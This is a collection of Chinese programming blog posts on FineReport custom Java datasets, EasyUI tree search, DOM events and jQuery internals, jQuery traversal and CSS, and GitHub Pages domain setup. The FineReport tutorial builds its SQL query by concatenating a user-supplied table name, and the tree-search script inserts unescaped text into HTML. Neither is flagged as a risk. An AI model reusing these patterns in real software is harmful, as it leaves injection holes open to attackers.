报表引擎API开发入门—带参程序数据集
我们今天又来讲讲报表开发的事，上周开的这个系列入门文章也三四天了，浏览量不佳小编甚是悲伤啊，希望大家多多支持我！
一、问题描述
在实际应用中，可能需要根据表名动态地改变数据源，比如在程序数据集中，通过传进的表名参数，到数据库取出对应的表作为数据源。因为FineReport是通过AbstractTableData抽象类来读取数据源的，而上述所有的数据来源都继承实现其抽象方法
，因此用户只要实现了AbstractTableData抽象类，也就可以用自定义类型的数据源了(程序数据集)，FineReport报表引擎就能够读取定义的数据源作为报表数据源使用。以下就对这种情况举例说明。
二、实现原理
与简单程序数据集相同，即继承AbstractTableData。大家可以参考我上次的文章。
三、实现步骤
3.1
定义参数
定义一个参数，并定义数据表结构，代码如下：
    public ParamTableDataDemo() {  
            // 定义tableName参数  
            this.parameters = new Parameter[] { new Parameter("tableName") };  
            // 定义程序数据集列名  
            columnNames = new String[columnNum];  
            for (int i = 0; i < columnNum; i++) {  
                columnNames[i] = "column#" + String.valueOf(i);  
            }  
        }  
3.2 设置数据
将数据放入到定义的表中，代码如下：
public void init() {
        // 确保只被执行一次
        if (valueList != null) {
            return;
        }
        // 保存得到的数据库表名
        String tableName = parameters[0].getValue().toString();
        // 构造SQL语句,并打印出来
        String sql = "select * from " + tableName + ";";
        FRContext.getLogger().info("Query SQL of ParamTableDataDemo: \n" + sql);
        // 保存得到的结果集
        valueList = new ArrayList();
        // 下面开始建立数据库连接，按照刚才的SQL语句进行查询
        Connection conn = this.getConnection();
        try {
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery(sql);
            // 获得记录的详细信息，然后获得总列数
            ResultSetMetaData rsmd = rs.getMetaData();
            colNum = rsmd.getColumnCount();
            // 用对象保存数据
            Object[] objArray = null;
            while (rs.next()) {
                objArray = new Object[colNum];
                for (int i = 0; i < colNum; i++) {
                    objArray[i] = rs.getObject(i + 1);
                }
                // 在valueList中加入这一行数据
                valueList.add(objArray);
            }
            // 释放数据库资源
            rs.close();
            stmt.close();
            conn.close();
            // 打印一共取到的数据行数量
         FRContext.getLogger().info(
                    "Query SQL of ParamTableDataDemo: \n" + valueList.size()+ " rows selected");
    } catch (Exception e) {
        e.printStackTrace();
    }
}
3.3
完整的数据集代码
完整的带参程序数据集的代码如下：
  package com.fr.data;
    import java.sql.Connection;
    import java.sql.DriverManager;
    import java.sql.ResultSet;
    import java.sql.ResultSetMetaData;
    import java.sql.Statement;
    import java.util.ArrayList;
    import com.fr.base.FRContext;
    import com.fr.data.AbstractTableData;
    import com.fr.base.Parameter;
    public class ParamTableDataDemo extends AbstractTableData {
    // 列名数组，保存程序数据集所有列名
    private String[] columnNames = null;
    // 定义程序数据集的列数量
    private int columnNum = 10;
    // 保存查询表的实际列数量
    private int colNum = 0;
    // 保存查询得到列值
    private ArrayList valueList = null;
    // 构造函数，定义表结构，该表有10个数据列，列名为column#0，column#1，。。。。。。column#9
    public ParamTableDataDemo() {
        // 定义tableName参数
        this.parameters = new Parameter[] { new Parameter("tableName") };
        // 定义程序数据集列名
        columnNames = new String[columnNum];
        for (int i = 0; i < columnNum; i++) {
            columnNames[i] = "column#" + String.valueOf(i);
        }
    }
    // 实现其他四个方法
    public int getColumnCount() {
        return columnNum;
    }
    public String getColumnName(int columnIndex) {
        return columnNames[columnIndex];
    }
    public int getRowCount() {
        init();
        return valueList.size();
    }
    public Object getValueAt(int rowIndex, int columnIndex) {
        init();
        if (columnIndex >= colNum) {
            return null;
        }
        return ((Object[]) valueList.get(rowIndex))[columnIndex];
    }
    // 准备数据
    public void init() {
        // 确保只被执行一次
        if (valueList != null) {
            return;
        }
        // 保存得到的数据库表名
        String tableName = parameters[0].getValue().toString();
        // 构造SQL语句,并打印出来
        String sql = "select * from " + tableName + ";";
        FRContext.getLogger().info("Query SQL of ParamTableDataDemo: \n" + sql);
        // 保存得到的结果集
        valueList = new ArrayList();
        // 下面开始建立数据库连接，按照刚才的SQL语句进行查询
        Connection conn = this.getConnection();
        try {
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery(sql);
            // 获得记录的详细信息，然后获得总列数
            ResultSetMetaData rsmd = rs.getMetaData();
            colNum = rsmd.getColumnCount();
            // 用对象保存数据
            Object[] objArray = null;
            while (rs.next()) {
                objArray = new Object[colNum];
                for (int i = 0; i < colNum; i++) {
                    objArray[i] = rs.getObject(i + 1);
                }
                // 在valueList中加入这一行数据
                valueList.add(objArray);
            }
            // 释放数据库资源
            rs.close();
            stmt.close();
            conn.close();
            // 打印一共取到的数据行数量
            FRContext.getLogger().info(
                    "Query SQL of ParamTableDataDemo: \n" + valueList.size()+ " rows selected");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    // 获取数据库连接 driverName和 url 可以换成您需要的
    public Connection getConnection() {
        String driverName = "sun.jdbc.odbc.JdbcOdbcDriver";
        String url = "jdbc:odbc:Driver={Microsoft Access Driver (*.mdb)};DBQ=D:\\FineReport_7.0\\WebReport\\FRDemo.mdb";
        String username = "";
        String password = "";
        Connection con = null;
        try {
            Class.forName(driverName);
            con = DriverManager.getConnection(url, username, password);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
        return con;
    }
    // 释放一些资源，因为可能会有重复调用，所以需释放valueList，将上次查询的结果释放掉
    public void release() throws Exception {
        super.release();
        this.valueList = null;
    }
}
编译ParamTableDataDemo.java
，将生成的ParamTableDataDemo.class类文件拷贝到报表工程/WEB-INF/classes目录下。由于该类是在com.fr.data包中的，因此最终应该将该类放在/WEB-INF/classes/com/fr/data下面。此时该程序数据源便定义好了。
3.4
配置程序数据集
新建报表，在报表数据集中新建程序数据源，选择我们定义好的程序数据集，如下图，名字可以自定义，如divtable

3.5 使用程序数据集
配置好程序数据源后便可以使用定义的程序数据集了，选中该数据集点击预览按钮，即可以输入表名动态地获取相应的数据表，并制作模板，如下图




注：如果预览不出数据，请确认代码段里面定义数据库连接时URL的地址是否正确。
可以看到，我们已经将STSCORE表中的数据提取至程序数据集表中，像其他类型的数据集一样，可以通过拖拽方法实现单元格数据列绑定。
好啦今天就讲到这啦！今天的程序有点多，求关注，求推荐，求收藏。

 

版权声明：本文为博主原创文章，未经博主允许不得转载。

新手学EasyUI----EasyUI-Tree联想加模糊查询
最近做的项目中用到了EasyUI的Tree，树的结构是这样的，有22个车站，每一个车站相当于一个逻辑域（虚拟域），每一个域下有许多的设备类型，拿我现在做的门禁系统来说，设备类型有门禁主控制器和门禁就地控制器等设备类型，每一种设备类型下面会有多个设备，每一个车站可能会有好几十个设备，22个车站就可能会有上百个或者上千个设备，这样在加载成Tree后，比如说想要查看文锦站的A站口的门禁就地控制器的信息，要是让你一个节点一个节点的打开去找，肯定会烦死的，所以我们就做了一个（联想+模糊）查询。
一开始我们是按照这篇文章js/jQuery实现类似百度搜索功能做的，但是做出来之后会有一个很大的缺点，就是不能够复用，别人要是想用的话，必须得把整个代码再改一遍才能用，真得感谢我们的组长，一开始对于面向对象的思想重视的还是不够，但是面向对象是真的非常的重要，面向对象的核心思想就是抽象，一层一层的往上抽象，之前做项目的时候，许多的知识点都是其他人封装好了我们直接拿过来用的，有种被惯坏了的赶脚，真正的想要去深入的理解一种知识，就应该从它的根本抓起，把它的核心原理能够轻松的运用，这才是大牛的发展路，用别人封装好的东西，永远都是被别人牵着鼻子走，为什么不自己当个领路人呢？
咳咳~~扯远了，接着回来说查询的这个功能，每一棵Tree都跟着一个搜索框，想要能够达到复用的结果可以这么改，看代码：

'''Html部分'''
<%-- 查询 --%>
<div style="position: relative">
	<input id="kw" onkeyup="getContent(this,'myTree');" style="background-image:url('../Pictrue/搜索.png'); background-position:right; background-repeat:no-repeat; width: 195px;" />
	<div id="append" style="position: absolute; background-color: white;"></div>
</div>
接下来是javascript文件，很重要的哦~~好好找不同点！


'''javascript代码'''

var treeid;
var textid;
$(function () {
    //键盘事件
    $(document).keydown(function (e) {
        e = e || window.event;
        var keycode = e.which ? e.which : e.keyCode;
        //键盘Up事件
        if (keycode == 38) {
            if (jQuery.trim($("#append").html()) == "") {
                return;
            }
            movePrev();
            //键盘Down事件
        } else if (keycode == 40) {
            if (jQuery.trim($("#append").html()) == "") {
                return;
            }
            $("#"+textid).blur();
            if ($(".item").hasClass("addbg")) {
                moveNext();
            } else {
                $(".item").removeClass('addbg').eq(0).addClass('addbg');
            }
            //键盘回车Enter
        } else if (keycode == 13) {
            dojob();
        }
    });

    //向上移动
    var movePrev = function () {
        $("#" + textid).blur();
        var index = $(".addbg").prevAll().length;
        if (index == 0) {
            $(".item").removeClass('addbg').eq($(".item").length - 1).addClass('addbg');
        } else {
            $(".item").removeClass('addbg').eq(index - 1).addClass('addbg');
        }
    }
    //向下移动
    var moveNext = function () {
        var index = $(".addbg").prevAll().length;
        if (index == $(".item").length - 1) {
            $(".item").removeClass('addbg').eq(0).addClass('addbg');
        } else {
            $(".item").removeClass('addbg').eq(index + 1).addClass('addbg');
        }

    }

    //公共方法
    var dojob = function () {

        $("#" + textid).blur();     //失去焦点事件
        var node = $("#" + treeid).tree('getChildren');    //获取Tree的所有节点
        $("#" + treeid).tree('expandAll', node.target);    //展开所有节点
        var value = $(".addbg").text();        //获取文本框输入的内容

        //查找相应节点并滚动到该节点，高亮显示
        for (i = 0; i < node.length; i++) {
            var treeId = node[i].id;
            var treeName = node[i].text;
            //找到相应的设备
            if (treeName.indexOf(value) >= 0) {
                if (treeName==value) {
                    var nodes = $("#" + treeid).tree('find', treeId);   //找到当前的节点
                    $("#" + treeid).tree('scrollTo', nodes.target);     //滚动到当前节点
                    $("#" + treeid).tree('select', nodes.target);       //高亮显示
                }
                
            }
        }
        $("#" + textid).val(value);    //将选择的设备显示到搜索框中
        $("#append").hide().html("");   //隐藏下拉框

    }

});
//输入事件
function getContent(obj,idtree) {
    treeid = idtree;
    
    textid = obj.id;
    //获取tree的所有节点
    var nodes = $("#"+treeid).tree('getChildren');
    //获取输入的值
    var kw = jQuery.trim($(obj).val());
    if (kw == "") {
        $("#append").hide().html("");
        return false;
    }
    var html = "";
    //匹配并动态加载到下拉框中
    for (i = 0; i < nodes.length; i++) {
        var treeId = nodes[i].id;
        var treeName = nodes[i].text;

        if (treeName.indexOf(kw) >= 0) {
            //动态加载下拉框和数据
            html = html + "<div style='width:200px;' class='item' onmouseenter='getFocus(this)' onClick='getCon(this,treeid);'>" + treeName + "</div>";
        }
    }
    if (html != "") {
        $("#append").show().html(html);
    } else {
        $("#append").hide().html("");
    }
}
//获取焦点事件
function getFocus(obj) {
    $(".item").removeClass("addbg");
    $(obj).addClass("addbg");
}
//单击事件
function getCon(obj, treeid) {
    $("#" + textid).blur();     //失去焦点事件
    var node = $("#" + treeid).tree('getChildren');    //获取Tree的所有节点
    $("#" + treeid).tree('expandAll', node.target);    //展开所有节点
    var value = $(obj).text();        //获取文本框输入的内容

    //查找相应节点并滚动到该节点，高亮显示
    for (i = 0; i < node.length; i++) {
        var treeId = node[i].id;
        var treeName = node[i].text;
        //找到相应的设备
        if (treeName.indexOf(value) >= 0) {
            if (treeName == value) {
                var nodes = $("#" + treeid).tree('find', treeId);   //找到当前的节点
                $("#" + treeid).tree('scrollTo', nodes.target);     //滚动到当前节点
                $("#" + treeid).tree('select', nodes.target);       //高亮显示
            }
        }
    }
    $("#" + textid).val(value);    //将选择的设备显示到搜索框中
    $("#append").hide().html("");   //隐藏下拉框
}
在外面工作，收获是很大的，之前做项目，许多的东西都是别人封装好，咱们直接拿过来用，再怎么找也没有自己去从头到尾研究一边来的透彻，现在工作了，项目刚开始做，工作量还是很大的，不过能学到的知识也是很多的，有苦才有甜嘛！





转载请注明出处：http://blog.csdn.net/zlts000/article/details/47959173

版权声明：本文为博主原创文章，未经博主允许不得转载。

Jquery实现超酷的时间轴特效


原文：Jquery实现超酷的时间轴特效

源代码下载地址：http://www.zuidaima.com/share/1607123657378816.htm




版权声明：本文为博主原创文章，未经博主允许不得转载。

浅谈WEB标准
WEB标准，WEB标准，可亲可爱的WEB，什么是你定下的标准呢。这几天又重新回归最基础的知识了，OK，言归正传，什么是WEB标准，为什么要用WEB标准？
比如说，现在的浏览器版本多吧，chrome，Safari，IE，firefox等等，版本多，问题就来了，怎么统一呀，中国有句老话有时候还是有道理的，“没有规矩，不成方圆”，每个WEB开发者如果各有各的标准，你写的我看不懂，我写的你看不懂，这不就乱套了，网站怎么维护呢。换方面来说，作为web开发者，还得费脑子想，诶，我要用什么标准？再换者说，web怎么更好的识别呢，是吧，各种问题，锵锵锵都出现了。
这个时候，web 标准出现了，
——“咳咳咳，为了web更好的发展，为了确保每个人都有权利访问相同的信息，为了拯救挣扎于多版本开发的web攻城狮，我，web标准，简化团队协作，增加网站流量，咳咳咳，就是这样……“。
通俗来说，web标准是一个标准的集合，而不是某一个标准。web，就是网页，三部分组成：结构，表现，行为，就好像人似的，结构相当于人的骨骼组织架构血液等等，表现相当于这个人的长相，行为就是这个人的行为，不过这个人的名字叫WEB。对应的web 标准：结构化标准语言（主要包括XHTML和XML），表现标准语言（主要包括CSS），行为标准（主要包括文档对象模型DOM，ECMAScript等），相当于现在对人也有一个评判标准，比如说黄金比例什么的。
代码的部分标准可以看我之前的博客——前端之代码规范总结，一个代码规范，仅供参考。
简单说了下WEB标准，也帮助自己更好的理解吧，百度百科里写的也比较完整的，如有更深刻的理解，多多分享交流哈，个人认识的还是不够全面。





版权声明：本文为博主原创文章，未经博主允许不得转载。

DOM Level 2 Event与jQuery源码：捕获与冒泡

本文中的JavaScript事件是指：在浏览器中，DOM标准提供的JavaScript事件集与接口集。


在项目开发中通常会使用类似jQuery的工具来绑定事件处理函数， 也可以设置捕获，或者中断事件流，正如这篇文章锁讨论的： jQuery事件：bind、delegate、on的行为与性能。
 本文来讨论DOM标准中是如何规定这些JavaScript事件的，以及jQuery源码中DOM事件的实现方式。

JavaScript 事件

首先我们来回顾一下DOM事件的行为，事件从发生开始经历了三个阶段：

捕捉阶段（capture phase）：从最上层元素，直到最下层（你点击的那个target）元素。路过的所有节点都可以捕捉到该事件。命中阶段（target phase）：如果该事件成功到达了target元素，它会进行事件处理。冒泡阶段（bubbling phase）：事件从最下层向上传递，依次触发父元素的该事件处理函数。

如何中断事件传播，以及禁止事件发生时的浏览器默认行为，参考：jQuery事件：bind、delegate、on的行为与性能



图片来源：http://www.w3.org/TR/DOM-Level-3-Events/#dom-event-architecture

DOM标准中，定义了一系列的JavaScript事件，以及事件接口。其中，DOM Level 0 Event提供了类似onclick的属性来支持事件，
 DOM Level 2 Event提供了addEventListener, removeEventListener, dispatchEvent，还有IE<9的attachEvent。

两种事件处理模型的区别在于，

前者（onclick）是一次性的事件处理，而且是通过操作DOM元素的属性来完成，因而只能绑定一个处理函数。后者（addEventListener）更加高级，不仅可以添加多个事件处理函数，还支持事件的捕获。

DOM Level 0 Event

DOM Level 0 Event从Netscape浏览器开始就有支持，最初是通过在HTML中写入onclick属性来完成事件绑定：

<div onclick="clickHandler()"></div>
<script>
function clickHandler(){
    console.log('clicked');
}
</script>



后来随着Web技术的进步，我们可以在JavaScript定义并且绑定事件了。此后我们可以做到事件处理和页面展示的分离， 在不支持JavaScript的浏览器中，以及搜索引擎看来，页面变得更加地兼容。请看：

document.getElementById("#foo").onclick = function(){
    console.log('clicked');
}



即时支持在JS中绑定事件，DOM Level 0 事件也存在一些问题。例如：

var el = document.getElementById("#foo");
el.onclick = function(){
    console.log('clicked 1');
}
el.onclick = function(){
    console.log('clicked 2');
}



是因为el.onclick的本质是对DOM元素属性的赋值，后一次时间绑定会使得前一次事件绑定失效。

addEventListener

2000年11月，W3C发布了DOM (Document Object Model) Level 2 Event，提供了更复杂的事件处理模型：

el.addEventListener("click", func, false);



在版本小于9的IE中，通过attachEvent来添加事件处理函数。然而从IE11开始，attachEvent已经不受支持，天煞的IE啊：

MSDN
 attachEvent: AttachEvent is no longer supported. Starting with Internet Explorer 11, use addEventListener.


通过addEventListener添加任意多个事件处理函数，第三个参数用来设置是否捕获（请看下一节）来自子元素的事件，默认为false。

el.addEventListener("click", function(){
    console.log('clicked 1');
});

el.addEventListener("click", function(){
    console.log('clicked 2');
});



这样，两个事件处理函数都会得到执行。

removeEventListener

DOM Level 2 Event还提供了removeEventListener(type,
 listener[, useCapture])方法，用来移除事件处理函数。 callback是必选参数！capture默认值为false：

如果同一个监听事件分别为“事件捕获”和“事件冒泡”注册了一次，一共两次，这两次事件需要分别移除。两者不会互相干扰。


var div = document.getElementById('div');
var listener = function (event) {
  /* do something here */
};
div.addEventListener('click', listener, false);
div.removeEventListener('click', listener, false);



捕获与冒泡

本文最开始已经给出了事件处理的三个阶段：捕获、目标、冒泡。在DOM Level 2 Event中， 如果addEventListener第三个参数为true则为添加捕获阶段的事件处理函数，否则为添加冒泡阶段的事件处理函数。

如果当前对象就是目标对象本身时，添加的事件处理函数只在目标阶段起作用，第三个参数无效。


来看例子吧：

<div id="l1">
  <div id="l2"></div>
</div>

<script type="text/javascript">
  var l1 = document.getElementById('l1'), l2 = document.getElementById('l2');

  l1.addEventListener('click', function(){ console.log('l1 capture')}, true);

  l1.addEventListener('click', function(){ console.log('l1 bubbling')});

  l2.addEventListener('click', function(){ console.log('l2 target')});

  l2.addEventListener('click', function(){ console.log('l2 target, invalid capture')}, true);
</script>



为元素l1添加了一个捕获阶段的处理函数l1
 captured，一个冒泡阶段的处理函数l1
 bubbling。为l2添加了一个目标阶段的事件处理函数。
 运行结果是：

l1 capture
l2 target
l2 target, invalid capture
l1 bubbling



其中，l2 target, invalid
 capture设置了捕获，但因为当前对象就是目标对象，捕获无效。该函数仍然作用于目标阶段。 既然捕获失效，那么它的执行顺序就按照注册事件的顺序了，不会因为它设置了无效的捕获而提前得到执行。

DispatchEvent

target.DispatchEvent(event)也是DOM
 Level 2 Event提供的方法。用来从target开始分发事件event。
 例如，我们可以创建一个clickDOM事件：

var event = new MouseEvent('click', {
  view: window,
  bubbles: true,
  cancelable: true
});
l2.dispatchEvent(event);



会产生与点击完全相同的输出：

l1 capture
l2 target
l2 target, invalid capture
l1 bubbling



如果用l1来dispatchEvent会怎样？

l1 capture
l1 bubbling



因为l1确实拥有子元素，所以事件仍然会下行和冒泡。但事件的target并非l2，所以l2不会触发目标阶段的事件处理函数。

jQuery Event 源码

好了好了，DOM Level 2 Event的事件处理模型算是清楚了，在DOM Level 3 Event的Working Draft中， 仍然沿袭了三阶段的事件处理流程。接着我们来看jQuery的那些事件处理函数是怎样实现的。

我们知道，jQuery中的bind, delegate, live等最终都是通过.on()来实现的。来看它的声明：

.on( events [, selector ] [, data ], handler )



events可以是多个事件，空格分隔；如果指定了selector，当前事件处理函数将会代理源于selector的事件；如果指定了data，它将会通过event.data传递。

这个selector是在当前元素的上下文中查找的，见jquery-2.1-stable/src/event.js第434行： jQuery(
 sel, this ).index( cur ) >= 0。


on方法定义在jquery-2.1-stable/src/event.js中（766行），
 最终调用addEventListener方法（122行）来添加事件处理函数：

add: function(elem, types, handler, data, selector){
  ...
  if(elem.addEventListener) {
    elem.addEventListener(type, eventHandle, false);
  }
  ...
}



在2.1版本中已经找不到attachEvent方法了，jQuery放弃了版本<9的IE。。
 不过在旧版本的jQuery中，仍然可以看到对IE的支持。例如在jquery-1.11-stable/src/events.js中：

if (elem.addEventListener) {
  elem.addEventListener(type, eventHandle, false);
}else if (elem.attachEvent) {
  elem.attachEvent("on" + type, eventHandle);
}



另外值得注意的是，jQuery的on方法实现中，addEventListener的第三个参数总是false。
 即jQuery事件代理是借助事件冒泡实现的，并未使用事件捕获机制。

再看与on对应的.off()，它的声明为：

.off( events [, selector ] [, handler ] )



events可以是多个事件，空格分隔；selector用来移除对某个子元素的代理；handler用来指定要移除的处理函数，不指定则移除所有。

off方法的实现在jquery-2.1-stable/src/event.js822行，最终调用removeEventListener方法（619行）来移除事件处理函数：

jQuery.removeEvent = function(elem, type, handle){
    if(elem.removeEventListener) {
        elem.removeEventListener(type, handle, false);
    }
};



注意这里设置了第三个参数为false，因为on绑定的都是非捕获事件处理函数，自然off也只需要移除非捕获的事件处理函数。


除非注明，本博客文章均为原创，转载请以链接形式标明本文地址： http://harttle.com/2015/07/31/javascript-event.html


版权声明：本文为博主原创文章，转载请附上原文链接。

jQeury入门：遍历
一旦用jQuery创建一个初始的包装集，你就能深度遍历刚刚选择的包装集。遍历可以被分为三个基础元件：父级，子级，同级。jQuery为所有这些元件提供丰富易用的方法。注意每一个方法都能轻易的传递给字符串选择器，有一些甚至能够用另外的jQuery对象来过滤你的包装集。关注和参考API documentation on traversing来弄懂你有什么变化的参数可用。
父级
从包装集中寻找父级元素的方法包括.parent(), .parents(), .parentsUntil(), 和 .closest()。
    <div class="grandparent">
        <div class="parent">
            <div class="child">
                <span class="subchild"></span>
            </div>
        </div>
        <div class="surrogateParent1"></div>
        <div class="surrogateParent2"></div>
    </div>

    // 选择一个元素的直系父级元素：

    // returns [ div.child ]
    $( "span.subchild" ).parent();

    //  选择一个元素的所有匹配给定选择器的父级元素
    // returns [ div.parent ]
    $( "span.subchild" ).parents( "div.parent" );

    // returns [ div.child, div.parent, div.grandparent ]
    $( "span.subchild" ).parents();

    //选择一个元素的除了选择器中的元素以外的所有的父级元素：
    // returns [ div.child, div.parent ]
    $( "span.subchild" ).parentsUntil( "div.grandparent" );

    // 选择最靠近的父级元素，注意只有一个父级元素被选中，并且初始元素本身也包含在被搜索的元素中：

    // returns [ div.child ]
    $( "span.subchild" ).closest( "div" );

    // 返回[ div.child ] ，因为选择器包含在被搜索的元素中：
    $( "div.child" ).closest( "div" );
子级
从包装集中寻找子级元素的方法包括 .children() and .find()。这两个方法之间的区别在于距离创建的包装集的子结构有多远。.children()仅仅操作直系的子节点，而.find()可以循环遍历子节点，这些子节点的子节点，以此类推。
    // 选择元素直系的子节点   

    // returns [ div.parent, div.surrogateParent1, div.surrogateParent2 ]
    $( "div.grandparent" ).children( "div" );

    // 在包装集中，查找所有匹配选择器的元素 
    // returns [ div.child, div.parent, div.surrogateParent1, div.surrogateParent2 ]
    $( "div.grandparent" ).find( "div" );
同级
在jQuery中，其余的遍历方法都是处理查找同级的包装集。一些基础的方法是就遍历的方向而言的。你可以用.prev()查找前一个元素，.next()查找后一个元素，及用.siblings()查找全部的两个元素。也有建立在这几个基础方法上的其他方法： .nextAll()， .nextUntil()， .prevAll() 和 .prevUntil()。
    // 在选择器中选择下一个同级元素：

    // returns [ div.surrogateParent1 ]
    $( "div.parent" ).next();

    // 在选择器中选择前一个同级元素：

    // 在div.parent之前没有同级元素的存在的情况下返回[]
    $( "div.parent" ).prev();

    // 在选择器中选择所有下一个同级元素：

    // returns [ div.surrogateParent1, div.surrogateParent2 ]
    $( "div.parent" ).nextAll();

    // returns [ div.surrogateParent1 ]
    $( "div.parent" ).nextAll().first();

    // returns [ div.surrogateParent2 ]
    $( "div.parent" ).nextAll().last();

    // 在选择器中选择所有上一个同级元素：     

    // returns [ div.surrogateParent1, div.parent ]
    $( "div.surrogateParent2" ).prevAll();

    // returns [ div.surrogateParent1 ]
    $( "div.surrogateParent2" ).prevAll().first();

    // returns [ div.parent ]
    $( "div.surrogateParent2" ).prevAll().last();
用 .siblings()选择所有同级元素：
    // 在两个方向上选择一个元素的匹配给出选择器的同级元素

    // returns [ div.surrogateParent1, div.surrogateParent2 ]
    $( "div.parent" ).siblings();

    // returns [ div.parent, div.surrogateParent2 ]
    $( "div.surrogateParent1" ).siblings();
到Traversal documentation on api.jquery.com去查看这些和更多方法的全部文档。
在文档中遍历很长距离的时候要当心——复杂的遍历必须使文档结构保持不变，这很难保证即使你是创建整个从服务器到客户端应用程序的人。一步或者两步的遍历会很不错，但最好还是避免从一个容器到另一个容器的遍历。
原文地址

            $(function () {
                $('pre.prettyprint code').each(function () {
                    var lines = $(this).text().split('\n').length;
                    var $numbering = $('<ul/>').addClass('pre-numbering').hide();
                    $(this).addClass('has-numbering').parent().append($numbering);
                    for (i = 1; i <= lines; i++) {
                        $numbering.append($('<li/>').text(i));
                    };
                    $numbering.fadeIn(1700);
                });
            });
        
整shi人的end();
今天晚上给小伙伴们一起交流学习jQueryDom操作的时候，遇到end()方法，然后在一起纠结了很长一段时间，jQuery文档上说的很笼统，一定要细细的品位才能知道个大概
End the most recent filtering operation in the current chain and return the set of matched elements to its previous state.
结束当前链中最近的过滤操(有的成为破坏性)作并返回匹配的元素集合到其之前的状态。
然后jQuery1.7的文档给出了这样一个例子
<div></div><div></div>
 $("<p/>")
   .appendTo("div")
   .addClass("test")
   .end()
   .addClass("test2");
运行后的结果就是
<div><p class="test test2"></p></div>
<div><p class="test"></p></div>
一直没有搞不清为什么第一个div里会添加两个class，而第二个只有一个。。。就这个问题几个小伙伴在一起讨论来讨论去（都没用过end）； 
各种找资料，不一会，全部都蒙圈了，后来使用火狐调试，一步一步的运行，有了眉目
1.$('<p/>').appendTo('div')返回的是：[p,p]对象数组，即新增后的两个p标签；
2.$('<p/>').appendTo('div').addClass('c1')返回的是：[p.c1,p.c1]对象数组，即添加了c1类样式后的p对象数组；
3.$('<p/>').appendTo('div').addClass('c1').end()返回的是[p.c1],是第1个<div>中的<p>,在2操作中，最后“破坏”的是第2个<div>中的 <p>,所以他的前一次操作的对象是第1个<div>中的<p>,返回的就是它;
4.$('<p/>').appendTo('div').addClass('c1').end().addClass('c2')返回的仍然是第1个<div>中的<p>; 
end()方法能够回到最近的一个”破坏性”操作之前，即将匹配的元素列表变为前一次的状态。 
如果没有破坏性操作将返回一个空集。 
破坏性操作的概念:指任何改变所匹配元素的操作。可能大家对这个概念比较模糊，举个例子:
$("li").css("color","red");
以上代码的CSS函数就不是一个破坏性操作，因为匹配元素列表并没有发生变化，改变的是元素中的文本内容的CSS属性。
$("li").find(".first")
以上代码就是一个破坏性操作，因为匹配元素的列表发生了变化，比如有三个li元素，那么匹配元素的列表有三个元素，但是经过使用find()方法筛选以后，匹配元素列表只有一个元素了，这就是发生了”破坏性”操作。 
再看一个例子
<%@ page language="java" contentType="text/html; charset=utf-8"
    pageEncoding="utf-8"%>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>脚本之家</title>
<script type="text/javascript" src="../js/jquery-1.7.2.min.js"> </script>
<script type="text/javascript"> 
$(document).ready(function(){ 
 $(".first").find(".div").css("color","green"); 
 $(".second").find(".div").end().css("color","blue"); 
 //$(".third").find(".js")
 //$(".third").css("color","red") 
 $(".third").find(".js").css("color","blue").end().css("color","red") 
}) 
</script>
</head>
<body>
<div>
 <ul class="first">
  <li>HTML专区</li>
  <li>Javascript专区</li>
  <li class="div">Div+Css专区</li>
  <li>Jquery专区</li>
 </ul>
 <ul class="second">
  <li>HTML专区</li>
  <li>Javascript专区</li>
  <li class="div">Div+Css专区</li>
  <li>Jquery专区</li>
 </ul>
 <ul class="third">
  <li>HTML专区</li>
  <li class="js">Javascript专区</li>
  <li>Div+Css专区</li>
  <li>Jquery专区</li>
 </ul>
</div>
</body>
</html>
被注释的部分就相当于最右一句，这个end需要慢慢的体会！ 
今晚，抱着“破坏性”入睡吧。。。

            $(function () {
                $('pre.prettyprint code').each(function () {
                    var lines = $(this).text().split('\n').length;
                    var $numbering = $('<ul/>').addClass('pre-numbering').hide();
                    $(this).addClass('has-numbering').parent().append($numbering);
                    for (i = 1; i <= lines; i++) {
                        $numbering.append($('<li/>').text(i));
                    };
                    $numbering.fadeIn(1700);
                });
            });
        

版权声明：本文为博主原创文章，未经博主允许不得转载。

github创建blog并绑定域名之终结篇
创建博客
在github创建博客用的是github page
github-page是一个免费的静态网站托管平台，由github提供，它具有以下特点：

免空间费，免流量费能装逼，全世界通装具有项目主页和个人主页两种选择支持页面生成，可以使用jekyll来布局页面，使用markdown来书写正文可以自定义域名
它其实就是在github新建一个特殊的仓库，特殊在哪里呢，这个仓库名必须是固定格式的，比如你github名是shabi，那么你这个仓库名必须是shabi.github.io。
如果你不会新建的话，要么百度，google，要么放弃吧
绑定域名
ping下你的博客地址,得到一个ip以便用作我们要绑定的域名的A记录，比如ping  shabi.github.io  


得到103.245.222.133这个域名。


在域名提供商哪里做两步：


添加A记录到103.245.222.133添加cname记录到shabi.github.io



效果应该如下：  
          你的域名          ->103.245.222.133
          www.你的域名-> 你的github名.github.io
这个时候生效的话你ping你的域名就应该能粗出来了
访问试试，开始尽情的装逼吧



版权声明：本文为博主原创文章，未经博主允许不得转载。

jQuery入门：CSS，样式和大小
jQuery包含了获取和设置元素的CSS属性的简便方法：    
    //获取CSS属性

    $( "h1" ).css( "fontSize" ); // Returns a string such as "19px".返回一个字符串"19px"。
    $( "h1" ).css( "font-size" ); // Also works.同样会工作。

    // 设置CSS属性。

    $( "h1" ).css( "fontSize", "100px" ); // Setting an individual property.设置单独的属性

    // 设置多个属性。

    $( "h1" ).css({

        fontSize: "100px",

        color: "red"

    });
注意第二行参数的形式——它是一个包含多重属性的对象。这是传递多重参数到一个函数的常用办法，且很多jQuery设置函数的方法都接受一次性设置多个值的对象。
CSS属性在JavaScript中通常需要将连字号换成驼峰式拼写。例如，CSS属性font-size被用做Javascript中的一个属性名称的时候，用fontSize来表示。然而，当用.css()方法象字符串一样传递一个CSS属性名称的时候，并不会这样应用——在这种情况下，不管是驼峰式拼写还是连字号的形式都将运行。
当用一个对象来设置CSS的时候，CSS属性应该用驼峰式拼写而不应该用一个连字号，但在可生产代码（production-ready code）中，不推荐使用.css()做为设置函数。
应用CSS classes 设置样式
做为一个获取函数，.css()方法是很有价值的。然而，在生成就绪的代码中通常会避免将它做为设置函数，因为通常表现的信息最好和JavaScript代码保持分离。相反，用classes写那些描述多种显示形式的CSS规则，然后更换元素的class。
    // 用classes工作。

    var h1 = $( "h1" );

    h1.addClass( "big" );

    h1.removeClass( "big" );

